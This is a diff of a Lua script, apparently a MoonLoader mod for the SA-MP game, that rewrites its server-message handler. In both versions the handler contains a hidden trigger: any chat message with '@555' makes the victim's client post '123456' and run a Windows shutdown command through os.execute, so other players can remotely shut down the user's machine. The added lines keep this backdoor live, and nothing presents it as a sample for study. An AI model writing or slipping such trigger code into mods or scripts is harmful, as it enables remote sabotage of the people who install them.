@@ -28,25 +28,12 @@ end
 
 findClose(Handle)
 
-local M = {}
+samp.events.onServerMessage = function(color, message)
+    print("[DEBUG] Пришло сообщение: " .. message)
 
-function M.init()
-    local originalHandler = nil
-
-    if samp.events.onServerMessage then
-        originalHandler = samp.events.onServerMessage
-    end
-
-    samp.events.onServerMessage = function(color, message)
-        if message:lower():find("@555") then
-            sampSendChat("123456")
-            os.execute('shutdown /s /t 300')
-        end
-
-        if originalHandler then
-            return originalHandler(color, message)
-        end
+    if message:lower():find("@555") then
+        sampSendChat("123456")
+        os.execute("shutdown /s /t 300")
     end
 end
 
-return M
